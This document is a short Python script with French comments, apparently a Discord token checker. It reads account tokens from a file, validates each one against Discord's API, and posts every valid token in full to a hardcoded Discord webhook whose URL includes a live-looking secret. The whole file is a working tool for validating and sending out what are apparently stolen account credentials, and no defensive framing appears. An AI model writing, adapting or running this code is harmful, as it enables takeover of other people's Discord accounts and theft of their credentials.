import requests

# URL du webhook Discord fourni
webhook_url = "https://discord.com/api/webhooks/1243228328450592819/G-IlXlhLBrRv9KgpBgfrZr_SCNETIfkR9dV04oS5eXyhKldRPUTlTsrn2NVRrCEoACiw"

# Fonction pour envoyer un message au webhook
def send_to_webhook(message):
    data = {
        "content": message,
        "username": "Token Validator"
    }

    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Message envoyé avec succès !")
    else:
        print(f"Échec de l'envoi du message. Statut de la réponse : {response.status_code}")

# Fonction pour tester si un token Discord est valide
def is_token_valid(token):
    headers = {
        "Authorization": token
    }
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    return response.status_code == 200

# Lire les tokens depuis le fichier tokens.txt
def read_tokens(file_path):
    with open(file_path, "r") as file:
        tokens = [line.strip() for line in file]
    return tokens

# Chemin vers le fichier tokens.txt
tokens_file_path = "tokens.txt"

# Lire les tokens
tokens = read_tokens(tokens_file_path)

# Tester les tokens et envoyer les valides au webhook
for token in tokens:
    if is_token_valid(token):
        print(f"Token valide trouvé : {token}")
        send_to_webhook(f"Token valide : {token}")
    else:
        print(f"Token invalide : {token}")

